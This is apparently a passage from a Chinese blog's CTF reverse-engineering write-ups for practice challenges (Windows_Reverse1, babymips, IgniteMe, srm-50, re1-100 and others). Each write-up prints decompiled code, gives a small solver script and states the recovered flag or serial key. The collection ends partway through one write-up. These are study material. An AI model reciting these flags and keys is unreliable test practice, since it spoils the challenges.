1Sharif_CTF(833489ef285e6fa80690099efc5d9c9d) dmd-50打开直接找到输入的flag的md5值，md5解密找到flag 1b781cbb29054db12f88f08c6e161c199 Windows_Reverse1这道题很有意思，首先查壳，发现是upx，直接脱壳，IDA打开，F5查看 1234567891011121314151617181920int __cdecl main(int argc, const char **argv, const char **envp){ char v4; // [esp+4h] [ebp-804h] char v5; // [esp+5h] [ebp-803h] char v6; // [esp+404h] [ebp-404h] char Dst; // [esp+405h] [ebp-403h] v6 = 0; memset(&amp;Dst, 0, 0x3FFu); v4 = 0; memset(&amp;v5, 0, 0x3FFu); printf(\"please input code:\"); scanf(\"%s\", &amp;v6); sub_401000(&amp;v6); if ( !strcmp(&amp;v4, \"DDCTF{reverseME}\") ) printf(\"You've got it!!%s\\n\", &amp;v4); else printf(\"Try again later.\\n\"); return 0;} 表面上看我们需要输入一个字符串，然后经过sub_401000的变换之后变成DDCTF{reverseME}，然后查看一下加密函数 1234567891011121314151617181920212223unsigned int __cdecl sub_401000(const char *a1){ _BYTE *v1; // ecx unsigned int v2; // edi unsigned int result; // eax int v4; // ebx v2 = 0; result = strlen(a1); if ( result ) { v4 = a1 - v1; do { *v1 = byte_402FF8[(char)v1[v4]]; ++v2; ++v1; result = strlen(a1); } while ( v2 &lt; result ); } return result;} 看起来是一个换表操作，但是在这里遇到了两个让人疑惑的事情，第一个，我们输入的字符串是怎么传入这个函数里面来的，第二个，在0x402FF8处什么都没有，这个表在哪里 所以还是需要仔细看看汇编代码 12345678910111213141516171819202122.text:004010A4 lea edx, [esp+824h+var_404].text:004010AB push edx.text:004010AC push offset aS ; \"%s\".text:004010B1 call ds:scanf.text:004010B7 lea eax, [esp+82Ch+var_404].text:004010BE push eax.text:004010BF lea ecx, [esp+830h+var_804].text:004010C3 call sub_401000.text:00401000 sub_401000 proc near ; CODE XREF: _main+73↓p.text:00401000.text:00401000 arg_0 = dword ptr 4.text:00401000.text:00401000 push ecx.text:00401001 push ebp.text:00401002 mov ebp, [esp+8+arg_0].text:00401006 push esi.text:00401007 mov eax, ebp.text:00401009 push edi.text:0040100A xor edi, edi.text:0040100C lea esi, [eax+1].text:0040100F nop 这里应该是人为修改了代码，可以看到我们输入的字符串地址被赋给了ecx，然后再我们的解密函数最开始，先把ecx里面的值压进了栈，所以这个函数用了ecx寄存器来传参，而这是个32位的程序，所以IDA这里检测的时候出现了一点问题，第一个问题解决了，再看看第二个，先来研究里面的索引值 123456789101112if ( result ) { v4 = a1 - v1; do { *v1 = byte_402FF8[(char)v1[v4]]; ++v2; ++v1; result = strlen(a1); } while ( v2 &lt; result ); } v1[v4]这个表达形式可以看得出来就是a1的首地址，而a1就是我们输入的字符串，都是可见字符，所以每个字符的值都要大于32，所以在0x402FF8这个位置向下偏移至少32的位置寻找，找到了真正的字母表 分析结束，可以直接动手逆向了，不过在导出这个字母表的时候很凑巧的发现这个字母表的值刚好是从126-32的排列，这说明我们输入的和变换出来的值相加正好为158，这就提供了一个更简单的逆向思路 12345678910111213#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;int main() { string target = \"DDCTF{reverseME}\"; string flag = \"\"; for (int i = 0; i &lt; target.length(); i++) { flag += 158 - target[i]; } cout &lt;&lt; flag &lt;&lt; endl;} 输出套上flag即可 1ZZ[JX#,9(9,+9QY! babymips这个题本身没有什么，很简单的算法，也没有什么加密、加壳，主要是有些受不了IDA+Retdec反汇编出来的代码，所以试了一下Ghidra 12345678910111213141516171819202122232425void FUN_004009a8(void){ int iVar1; int iStack48; byte abStack44 [36]; setbuf(stdout,(char *)0x0); setbuf(stdin,(char *)0x0); printf(\"Give me your flag:\"); scanf(\"%32s\",abStack44); iStack48 = 0; while (iStack48 &lt; 0x20) { abStack44[iStack48] = abStack44[iStack48] ^ 0x20U - (char)iStack48; iStack48 = iStack48 + 1; } iVar1 = strncmp((char *)abStack44,_fdata,5); if (iVar1 == 0) { FUN_004007f0(abStack44); } else { puts(\"Wrong\"); } return;} 首先是输入flag，然后进行一个变换，先比较前5位，如果一致进入下一个变换 12345678910111213141516171819202122232425262728void FUN_004007f0(char *param_1){ size_t sVar1; int iVar2; uint uStack16; uStack16 = 5; while (sVar1 = strlen(param_1), uStack16 &lt; sVar1) { if ((uStack16 &amp; 1) == 0) { param_1[uStack16] = (byte)((uint)((int)param_1[uStack16] &lt;&lt; 0x1a) &gt;&gt; 0x18) | param_1[uStack16] &gt;&gt; 6; } else { param_1[uStack16] = param_1[uStack16] &gt;&gt; 2 | (byte)((uint)((int)param_1[uStack16] &lt;&lt; 0x1e) &gt;&gt; 0x18); } uStack16 = uStack16 + 1; } iVar2 = strncmp(param_1 + 5,PTR_DAT_00410d04,0x1b); if (iVar2 == 0) { puts(\"Right!\"); } else { puts(\"Wrong!\"); } return;} 后面对奇数位和偶数位进行了两个不同的位运算，很清晰，仔细分析一下会发现实际上是前后位置的一个交换，并且奇偶运算就是互为逆运算，逆向的时候更方便处理了。最后是进行简单的字符串比较，然后程序就结束了。 12345678910111213141516171819202122232425262728293031#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;int main() { string target = \"Q|j{g\\x52\\xfd\\x16\\xa4\\x89\\xbd\\x92\\x80\\x13\\x41\\x54\\xa0\\x8d\\x45\\x18\\x81\\xde\\xfc\\x95\\xf0\\x16\\x79\\x1a\\x15\\x5b\\x75\\x1f\"; string flag = \"\"; for (int i = 0; i &lt; target.length(); i++) { if(i&gt;=5) { int32_t tmp=target[i]; if(i%2==0) { tmp=((tmp&amp;0x3)&lt;&lt;6)|((tmp&amp;0xfc)&gt;&gt;2); } else { tmp=((tmp&amp;0xc0)&gt;&gt;6)|((tmp&amp;0x3f)&lt;&lt;2); } flag+=(tmp^(0x20-i)); } else { flag+=(target[i]^(0x20-i)); } } cout &lt;&lt; flag &lt;&lt; endl;} 需要注意的两点，运算符优先级的问题，加减运算要先于移位运算先于位运算，处理的时候需要注意，还有，移位的时候要注意把多余的位置清0，这里用的是与运算 输出flag 1qctf{ReA11y_4_B@89_mlp5_4_XmAn_}","link":"/2020/02/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%89%EF%BC%89/"},{"title":"攻防世界-re部分题解（二）","text":"题目有点多，放在一篇里面太过臃肿，所以多分了几篇 IgniteMeIDA打开，首先发现flag的格式，EIS{***} 找到关键函数 123456789101112131415161718192021222324252627282930313233343536bool __cdecl sub_4011C0(char *a1){ size_t v2; // eax signed int v3; // [esp+50h] [ebp-B0h] char v4[32]; // [esp+54h] [ebp-ACh] int v5; // [esp+74h] [ebp-8Ch] int v6; // [esp+78h] [ebp-88h] size_t i; // [esp+7Ch] [ebp-84h] char v8[128]; // [esp+80h] [ebp-80h] if ( strlen(a1) &lt;= 4 ) return 0; i = 4; v6 = 0; while ( i &lt; strlen(a1) - 1 ) v8[v6++] = a1[i++]; v8[v6] = 0; v5 = 0; v3 = 0; // v8=a1 memset(v4, 0, 0x20u); for ( i = 0; ; ++i ) { v2 = strlen(v8); if ( i &gt;= v2 ) break; if ( v8[i] &gt;= 'a' &amp;&amp; v8[i] &lt;= 'z' ) { v8[i] -= 32; v3 = 1; } if ( !v3 &amp;&amp; v8[i] &gt;= 'A' &amp;&amp; v8[i] &lt;= 'Z' ) v8[i] += 32; //大小写互换 v4[i] = byte_4420B0[i] ^ sub_4013C0(v8[i]); //唯一一步有用的计算 v3 = 0; } return strcmp(\"GONDPHyGjPEKruv{{pj]X@rF\", v4) == 0; 据此写脚本逆向 123456789101112131415161718192021222324252627282930313233#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;string&gt;using namespace std;int main() { string v4=\"GONDPHyGjPEKruv{{pj]X@rF\"; unsigned char byte_4420B0[] = { 13, 19, 23, 17, 2, 1, 32, 29, 12, 2, 25, 47, 23, 43, 36, 31, 30, 22, 9, 15, 21, 39, 19, 38, 10, 47, 30, 26, 45, 12, 34, 4 }; char v8[v4.length()]; for (int i = 0;i&lt;v4.length() ; ++i ) { v8[i]=((v4[i]^byte_4420B0[i])-72)^0x55; if ( v8[i] &gt;= 'a' &amp;&amp; v8[i] &lt;= 'z' ) { v8[i] -= 32; } else if(v8[i] &gt;= 'A' &amp;&amp; v8[i] &lt;= 'Z'){ v8[i] += 32; } else{ continue; } } cout&lt;&lt;v8&lt;&lt;endl; return 0;} 把输出和我们已知的部分结合起来得到flag 1EIS{wadx_tdgk_aihc_ihkn_pjlm} hackme通过字符串找到关键部分 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354__int64 __fastcall sub_400F8E(__int64 a1, __int64 a2){ __int64 v2; // rdx __int64 v3; // rcx __int64 v4; // r8 __int64 v5; // r9 int index; // eax char v8[136]; // [rsp+10h] [rbp-B0h] int v9; // [rsp+98h] [rbp-28h] char v10; // [rsp+9Fh] [rbp-21h] int v11; // [rsp+A0h] [rbp-20h] unsigned __int8 v12; // [rsp+A6h] [rbp-1Ah] char v13; // [rsp+A7h] [rbp-19h] int v14; // [rsp+A8h] [rbp-18h] int v15; // [rsp+ACh] [rbp-14h] unsigned int v16; // [rsp+B0h] [rbp-10h] int v17; // [rsp+B4h] [rbp-Ch] _BOOL4 v18; // [rsp+B8h] [rbp-8h] int i; // [rsp+BCh] [rbp-4h] printf((unsigned __int64)\"Give me the password: \"); scanf((__int64)\"%s\", v8, a2); for ( i = 0; v8[i]; ++i ) ; v18 = i == 22; v17 = 10; do { index = rand((__int64)\"%s\", (__int64)v8, v2, v3, v4, v5); v3 = (unsigned int)(index % 22); v14 = index % 22; v16 = 0; v13 = byte_6B4270[index % 22]; v12 = v8[index % 22]; v11 = index % 22 + 1; v15 = 0; while ( v15 &lt; v11 ) { ++v15; v16 = 1828812941 * v16 + 12345; } v2 = v16; v10 = v16 ^ v12; if ( v13 != ((unsigned __int8)v16 ^ v12) ) v18 = 0; --v17; } while ( v17 ); if ( v18 ) v9 = printf((unsigned __int64)\"Congras\\n\"); else v9 = printf((unsigned __int64)\"Oh no!\\n\"); return 0LL;} 就是个简单的运算，写个脚本逆运算一下就出来了 1234567891011121314151617181920212223242526272829303132#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;string&gt;using namespace std;int main() { unsigned char byte_6B4270[] = { 95, 242, 94, 139, 78, 14, 163, 170, 199, 147, 129, 61, 95, 116, 163, 9, 145, 43, 73, 40, 147, 103 }; char v13; char v12; char v8[23]; unsigned int v16=0; for(int i=0;i&lt;22;i++) { v16=0; v13=byte_6B4270[i]; int v11=i+1; int v15=0; while(v15&lt;v11){ ++v15; v16=1828812941 * v16 + 12345; } v8[i]=v13^v16; } cout&lt;&lt;v8&lt;&lt;endl; return 0;} 输出flag 1flag{d826e6926098ef46} easyre还是通过字符串找到关键函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748int sub_401080(){ unsigned int v0; // kr00_4 signed int v1; // edx char *v2; // esi char v3; // al unsigned int v4; // edx int v5; // eax __int128 v7; // [esp+2h] [ebp-24h] __int64 v8; // [esp+12h] [ebp-14h] int v9; // [esp+1Ah] [ebp-Ch] __int16 v10; // [esp+1Eh] [ebp-8h] printf(\"input：\", v7); v9 = 0; v10 = 0; v7 = 0i64; v8 = 0i64; scanf((const char *)&amp;dword_402158, (unsigned int)&amp;v7); v0 = strlen((const char *)&amp;v7); if ( v0 &gt;= 16 &amp;&amp; v0 == 24 ) // flag共24位 { v1 = 0; v2 = (char *)&amp;v8 + 7; do { v3 = *v2--; byte_40336C[v1++] = v3; // 输入的flag倒序 } while ( v1 &lt; 24 ); v4 = 0; do { byte_40336C[v4] = (byte_40336C[v4] + 1) ^ 6; ++v4; } while ( v4 &lt; 24 ); v5 = strcmp(byte_40336C, \"xIrCj~&lt;r|2tWsv3PtI\\x7Fzndka\"); if ( v5 ) v5 = -(v5 &lt; 0) | 1; if ( !v5 ) { printf(\"right\\n\", v7); system(\"pause\"); } } return 0;} 里面的算法变得复杂而毫无意义，真正实现的功能就两个，首先将输入的字符串逆序，然后进行一个变换，最后得到已知的字符串 12345target='xIrCj~&lt;r|2tWsv3PtI\\x7Fzndka'flag=''for i in target: flag+=chr((ord(i)^6)-1)print(flag[::-1]) 输出flag 1flag{xNqU4otPq3ys9wkDsN} shuffle打开把所有的整数转换为字符就看到了flag 1SECCON{Welcome to the SECCON 2014 CTF!} re-for-50-plz-50这题是MIPS，IDA直接反编译不出来，MIPS指令学的也不是很好，所以直接用retdec插件 retdec直接反编译出来 123456789101112131415int main(int argc, char ** argv) { // 0x401398 for (int32_t i = 0; i &lt; 31; i++) { char v1 = *(char *)(i + (int32_t)\"cbtcqLUBChERV[[Nh@_X^D]X_YPV[CJ\"); // 0x4013d8 char v2 = *(char *)(*(int32_t *)((int32_t)argv + 4) + i); // 0x4013f0 if ((int32_t)v1 != ((int32_t)v2 ^ 55)) { // 0x401408 print(); exit_funct(); } } // 0x401444 exit_funct(); return 1;} 可以发现只有一个异或操作 12345target=\"cbtcqLUBChERV[[Nh@_X^D]X_YPV[CJ\"flag=''for i in target: flag+=chr((ord(i)^55))print(flag) 输出flag 1TUCTF{but_really_whoisjohngalt} parallel-comparator-200代码审计，直接给出了源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;pthread.h&gt;#define FLAG_LEN 20void * checking(void *arg) { char *result = malloc(sizeof(char)); char *argument = (char *)arg; *result = (argument[0]+argument[1]) ^ argument[2]; return result;}int highly_optimized_parallel_comparsion(char *user_string){ int initialization_number; int i; char generated_string[FLAG_LEN + 1]; generated_string[FLAG_LEN] = '\\0'; while ((initialization_number = random()) &gt;= 64); int first_letter; first_letter = (initialization_number % 26) + 97; pthread_t thread[FLAG_LEN]; char differences[FLAG_LEN] = {0, 9, -9, -1, 13, -13, -4, -11, -9, -1, -7, 6, -13, 13, 3, 9, -13, -11, 6, -7}; char *arguments[20]; for (i = 0; i &lt; FLAG_LEN; i++) { arguments[i] = (char *)malloc(3*sizeof(char)); arguments[i][0] = first_letter; arguments[i][1] = differences[i]; arguments[i][2] = user_string[i]; pthread_create((pthread_t*)(thread+i), NULL, checking, arguments[i]); } void *result; int just_a_string[FLAG_LEN] = {115, 116, 114, 97, 110, 103, 101, 95, 115, 116, 114, 105, 110, 103, 95, 105, 116, 95, 105, 115}; for (i = 0; i &lt; FLAG_LEN; i++) { pthread_join(*(thread+i), &amp;result); generated_string[i] = *(char *)result + just_a_string[i]; free(result); free(arguments[i]); } int is_ok = 1; for (i = 0; i &lt; FLAG_LEN; i++) { if (generated_string[i] != just_a_string[i]) return 0; } return 1;}int main(){ char *user_string = (char *)calloc(FLAG_LEN+1, sizeof(char)); fgets(user_string, FLAG_LEN+1, stdin); int is_ok = highly_optimized_parallel_comparsion(user_string); if (is_ok) printf(\"You win!\\n\"); else printf(\"Wrong!\\n\"); return 0;} 源码比较长，但是做的事情不多，需要注意三个函数的用法 第一个是pthread_create()用来创建一个新的线程 1int pthread_create(pthread_t *tidp,const pthread_attr_t *attr,(void*)(*start_rtn)(void*),void *arg); 几个参数分别是，指向线程的指针，线程的属性，调用的函数和参数，在这段代码里实际上就是调用checking()函数，并把之前设定好的参数传给函数 第二个是pthread_join()用来传递返回结果 1int pthread_join(pthread_t thread, void **retval); 所以result就是指向返回结果的指针，所以最终的目的就是让checking()函数返回的值为0 第三个是random()函数，在这之前没有用随机种子初始化生成器，所以随机数生成的结果不管怎么运行都是一样的，但是需要注意linux下random()和windows下rand()生成的数据并不一样 此外还需要注意一点，在c++里面，赋值语句的返回值是赋的值而不是布尔值 所以只需要根据checking()函数来逆向运算一下就可以得到结果了 1234567891011121314151617181920212223#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;string&gt;#define FLAG_LEN 20using namespace std;int main() { char differences[FLAG_LEN] = {0, 9, -9, -1, 13, -13, -4, -11, -9, -1, -7, 6, -13, 13, 3, 9, -13, -11, 6, -7}; int first_letter; first_letter = 108; char flag[FLAG_LEN]; for (int i = 0; i &lt; FLAG_LEN; i++) { flag[i] = first_letter + differences[i]; } cout &lt;&lt; flag &lt;&lt; endl; return 0;} 输出flag 1lucky_hacker_you_are secret-galaxy-300题目里面只有一个结构体，运行了一遍什么都没发现，OD调试的时候查找字符串找到flag 1aliens_are_around_us srm-50这题是个简单的注册机，找到关键函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293BOOL __stdcall DialogFunc(HWND hDlg, UINT a2, WPARAM a3, LPARAM a4){ HMODULE v5; // eax HICON v6; // eax HMODULE v7; // eax HCURSOR v8; // ST20_4 HWND v9; // eax CHAR String; // [esp+8h] [ebp-340h] CHAR v11[4]; // [esp+108h] [ebp-240h] char v12; // [esp+10Ch] [ebp-23Ch] char v13; // [esp+10Dh] [ebp-23Bh] char v14; // [esp+10Eh] [ebp-23Ah] char v15; // [esp+10Fh] [ebp-239h] char v16; // [esp+110h] [ebp-238h] char v17; // [esp+111h] [ebp-237h] char v18; // [esp+112h] [ebp-236h] char v19; // [esp+113h] [ebp-235h] char v20; // [esp+114h] [ebp-234h] char v21; // [esp+115h] [ebp-233h] char v22; // [esp+116h] [ebp-232h] char v23; // [esp+117h] [ebp-231h] CHAR Text; // [esp+208h] [ebp-140h] char Src[16]; // [esp+308h] [ebp-40h] __int128 v26; // [esp+318h] [ebp-30h] int v27; // [esp+328h] [ebp-20h] __int128 v28; // [esp+32Ch] [ebp-1Ch] int v29; // [esp+33Ch] [ebp-Ch] __int16 v30; // [esp+340h] [ebp-8h] if ( a2 == 16 ) { EndDialog(hDlg, 0); return 0; } if ( a2 == 272 ) { v5 = GetModuleHandleW(0); v6 = LoadIconW(v5, (LPCWSTR)0x67); SetClassLongA(hDlg, -14, (LONG)v6); v7 = GetModuleHandleW(0); v8 = LoadCursorW(v7, (LPCWSTR)0x66); v9 = GetDlgItem(hDlg, 1); SetClassLongA(v9, -12, (LONG)v8); return 1; } if ( a2 != 273 || (unsigned __int16)a3 != 1 ) return 0; memset(&amp;String, (unsigned __int16)a3 - 1, 0x100u); memset(v11, 0, 0x100u); memset(&amp;Text, 0, 0x100u); GetDlgItemTextA(hDlg, 1001, &amp;String, 256); GetDlgItemTextA(hDlg, 1002, v11, 256); if ( strstr(&amp;String, \"@\") &amp;&amp; strstr(&amp;String, \".\") &amp;&amp; strstr(&amp;String, \".\")[1] &amp;&amp; strstr(&amp;String, \"@\")[1] != 46 ) { v28 = xmmword_410AA0; v29 = 1701999980; *(_OWORD *)Src = xmmword_410A90; v30 = 46; v26 = xmmword_410A80; v27 = 3830633; if ( strlen(v11) != 16 || v11[0] != 67 || v23 != 88 || v11[1] != 90 || v11[1] + v22 != 155 || v11[2] != 57 || v11[2] + v21 != 155 || v11[3] != 100 || v20 != 55 || v12 != 109 || v19 != 71 || v13 != 113 || v13 + v18 != 170 || v14 != 52 || v17 != 103 || v15 != 99 || v16 != 56 ) { strcpy_s(&amp;Text, 0x100u, (const char *)&amp;v28); } else { strcpy_s(&amp;Text, 0x100u, Src); strcat_s(&amp;Text, 0x100u, v11); } } else { strcpy_s(&amp;Text, 0x100u, \"Your E-mail address in not valid.\"); } MessageBoxA(hDlg, &amp;Text, \"Registeration\", 0x40u); return 1;} 过程十分简单，先简单判断邮箱是不是符合格式，如果符合进入序列号的判断，序列号的判断关键也就只有一个if条件，然后就会输出注册有没有成功 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;string&gt;using namespace std;int main() { char v11[17]={0}; v11[0] = 'C'; v11[15] = 'X'; v11[1] = 'Z'; v11[14] = 155-v11[1]; v11[2] = 57; v11[13] = 155-v11[2]; v11[3] = 100; v11[12] = 55; v11[4] = 109; v11[11] = 71; v11[5] = 113; v11[10] = 170-v11[5]; v11[6] = 52; v11[9] = 103; v11[7] = 99; v11[8] = 56; cout&lt;&lt;v11&lt;&lt;endl; return 0;} 输出结果为 1CZ9dmq4c8g9G7bAX Mysterious通过字符串找到关键函数 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950int __stdcall sub_401090(HWND hWnd, int a2, int a3, int a4){ char v5; // [esp+50h] [ebp-310h] CHAR Text[4]; // [esp+154h] [ebp-20Ch] char v7; // [esp+159h] [ebp-207h] __int16 v8; // [esp+255h] [ebp-10Bh] char v9; // [esp+257h] [ebp-109h] int v10; // [esp+258h] [ebp-108h] CHAR String; // [esp+25Ch] [ebp-104h] char v12; // [esp+25Fh] [ebp-101h] char v13; // [esp+260h] [ebp-100h] char v14; // [esp+261h] [ebp-FFh] memset(&amp;String, 0, 0x104u); v10 = 0; if ( a2 == 16 ) { DestroyWindow(hWnd); PostQuitMessage(0); } else if ( a2 == 273 ) { if ( a3 == 1000 ) { GetDlgItemTextA(hWnd, 1002, &amp;String, 260); strlen(&amp;String); if ( strlen(&amp;String) &gt; 6 ) ExitProcess(0); v10 = atoi(&amp;String) + 1; if ( v10 == 123 &amp;&amp; v12 == 'x' &amp;&amp; v14 == 'z' &amp;&amp; v13 == 'y' ) { strcpy(Text, \"flag\"); memset(&amp;v7, 0, 0xFCu); v8 = 0; v9 = 0; _itoa(v10, &amp;v5, 10); strcat(Text, \"{\"); strcat(Text, &amp;v5); strcat(Text, \"_\"); strcat(Text, \"Buff3r_0v3rf|0w\"); strcat(Text, \"}\"); MessageBoxA(0, Text, \"well done\", 0); } SetTimer(hWnd, 1u, 0x3E8u, TimerFunc); } if ( a3 == 1001 ) KillTimer(hWnd, 1u); } return 0;} 发现我们只要输入122xyz，就会输出flag，而且flag也可以直接拼凑出来 1flag{123_Buff3r_0v3rf|0w} re1-100这题题目里面的if实在是太多了，主要是为了判断是不是有debugger，所以不能通过调试的方式获得flag，所以还是要研究一下代码 1234567891011121314151617181920212223242526272829303132333435if ( strlen(bufParentRead) == 42 ) { if ( !strncmp(&amp;bufParentRead[1], \"53fc275d81\", 10uLL) ) { if ( bufParentRead[strlen(bufParentRead) - 1] == '}' ) { if ( !strncmp(&amp;bufParentRead[31], \"4938ae4efd\", 10uLL) ) { if ( !confuseKey(bufParentRead, 42) ) { responseFalse(); } else if ( !strncmp(bufParentRead, \"{daf29f59034938ae4efd53fc275d81053ed5be8c}\", 42uLL) ) { responseTrue(); } else { responseFalse(); } } else { responseFalse(); } } else { responseFalse(); } } else { responseFalse(); } 截取了其中一段，这里把flag分成了4个部分，每段10个字符，已经知道第一段地最后一段，但是也知道经过confuseKey()之后flag是什么，所以我们只要研究一下confusekey()就可以了 12345678910111213141516171819202122232425262728293031323334353637383940414243444546bool __cdecl confuseKey(char *szKey, int iKeyLength){ char szPart1[15]; // [rsp+10h] [rbp-50h] char szPart2[15]; // [rsp+20h] [rbp-40h] char szPart3[15]; // [rsp+30h] [rbp-30h] char szPart4[15]; // [rsp+40h] [rbp-20h] unsigned __int64 v7; // [rsp+58h] [rbp-8h] v7 = __readfsqword(0x28u); *(_QWORD *)szPart1 = 0LL; *(_DWORD *)&amp;szPart1[8] = 0; *(_WORD *)&amp;szPart1[12] = 0; szPart1[14] = 0; *(_QWORD *)szPart2 = 0LL; *(_DWORD *)&amp;szPart2[8] = 0; *(_WORD *)&amp;szPart2[12] = 0; szPart2[14] = 0; *(_QWORD *)szPart3 = 0LL; *(_DWORD *)&amp;szPart3[8] = 0; *(_WORD *)&amp;szPart3[12] = 0; szPart3[14] = 0; *(_QWORD *)szPart4 = 0LL; *(_DWORD *)&amp;szPart4[8] = 0; *(_WORD *)&amp;szPart4[12] = 0; szPart4[14] = 0; if ( iKeyLength != 42 ) return 0; if ( !szKey ) return 0; if ( strlen(szKey) != 42 ) return 0; if ( *szKey != '{' ) return 0; strncpy(szPart1, szKey + 1, 0xAuLL); strncpy(szPart2, szKey + 11, 0xAuLL); strncpy(szPart3, szKey + 21, 0xAuLL); strncpy(szPart4, szKey + 31, 0xAuLL); memset(szKey, 0, iKeyLength); *szKey = 123; strcat(szKey, szPart3); strcat(szKey, szPart4); strcat(szKey, szPart1); strcat(szKey, szPart2); szKey[41] = 125; return 1;} 内容挺多，实际上只实现了一件事情，把四段调换了一个顺序，变成了3421的顺序，所以调整一下顺序就出来了 153fc275d81053ed5be8cdaf29f59034938ae4efd crazy这题c++17编写，还有类，乍一看有点复杂，但实际上不是很难 还是先看关键函数，这里在main函数里就进行了处理 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475int __cdecl main(int argc, const char **argv, const char **envp){ __int64 v3; // rax __int64 v4; // rax __int64 v5; // rax __int64 v6; // rax __int64 v7; // rax __int64 v8; // rax __int64 v9; // rax __int64 v10; // rax __int64 v11; // rax __int64 v12; // rax __int64 v13; // rax __int64 v14; // rax __int64 v15; // rax __int64 v16; // rax char v18; // [rsp+10h] [rbp-130h] char v19; // [rsp+30h] [rbp-110h] char v20; // [rsp+50h] [rbp-F0h] char v21; // [rsp+70h] [rbp-D0h] char v22; // [rsp+90h] [rbp-B0h] char v23; // [rsp+B0h] [rbp-90h] unsigned __int64 v24; // [rsp+128h] [rbp-18h] v24 = __readfsqword(0x28u); std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_string(&amp;v18, argv, envp); std::operator&gt;&gt;&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;std::cin, &amp;v18); v3 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"-------------------------------------------\"); std::ostream::operator&lt;&lt;(v3, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v4 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"Quote from people's champ\"); std::ostream::operator&lt;&lt;(v4, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v5 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"-------------------------------------------\"); std::ostream::operator&lt;&lt;(v5, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v6 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;( &amp;std::cout, \"*My goal was never to be the loudest or the craziest. It was to be the most entertaining.\"); std::ostream::operator&lt;&lt;(v6, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v7 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"*Wrestling was like stand-up comedy for me.\"); std::ostream::operator&lt;&lt;(v7, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v8 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;( &amp;std::cout, \"*I like to use the hard times in the past to motivate me today.\"); std::ostream::operator&lt;&lt;(v8, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v9 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"-------------------------------------------\"); std::ostream::operator&lt;&lt;(v9, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); HighTemplar::HighTemplar((DarkTemplar *)&amp;v23, (__int64)&amp;v18); v10 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"Checking....\"); std::ostream::operator&lt;&lt;(v10, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_string(&amp;v19, &amp;v18); func1((__int64)&amp;v20, (__int64)&amp;v19); func2((__int64)&amp;v21, (__int64)&amp;v20); func3((__int64)&amp;v21, 0); std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(&amp;v21); std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(&amp;v20); std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(&amp;v19); HighTemplar::calculate((HighTemplar *)&amp;v23); if ( (unsigned int)HighTemplar::getSerial((HighTemplar *)&amp;v23) == 0 ) { v11 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"/////////////////////////////////\"); std::ostream::operator&lt;&lt;(v11, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v12 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"Do not be angry. Happy Hacking :)\"); std::ostream::operator&lt;&lt;(v12, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v13 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"/////////////////////////////////\"); std::ostream::operator&lt;&lt;(v13, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); ZN11HighTemplar7getFlagB5cxx11Ev((__int64)&amp;v22, (__int64)&amp;v23); v14 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"flag{\"); v15 = std::operator&lt;&lt;&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(v14, &amp;v22); v16 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(v15, \"}\"); std::ostream::operator&lt;&lt;(v16, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(&amp;v22); } HighTemplar::~HighTemplar((HighTemplar *)&amp;v23); 